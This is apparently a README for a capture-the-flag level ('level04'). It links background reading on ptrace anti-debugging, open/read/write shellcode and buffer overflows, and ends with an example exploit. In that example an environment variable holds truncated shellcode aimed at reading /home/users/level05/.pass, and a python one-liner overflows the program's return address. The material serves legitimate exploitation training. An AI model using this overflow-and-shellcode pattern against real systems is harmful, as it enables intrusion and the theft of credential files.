Conceptual resources for Level04

This folder provides background links about anti-debugging, ptrace, and non-execve shellcode techniques used in `level04`. The original walkthrough includes the example commands to run inside a 32-bit VM — no helper programs are required for testing.


Recommended reading:

- `ptrace` and anti-debugging concepts: https://man7.org/linux/man-pages/man2/ptrace.2.html
- Shellcode using open/read/write syscalls: https://shell-storm.org/shellcode/
- Buffer overflow fundamentals: https://owasp.org/www-community/vulnerabilities/Buffer_Overflow

Example (run inside a 32-bit VM):

```bash
# Example: place shellcode in SHELLCODE and overflow return address (address depends on your environment)
export SHELLCODE=$'\x31\xc0.../home/users/level05/.pass'
python -c "print 'A' * 156 + '\x9e\xd8\xff\xff'" | ./level04
```

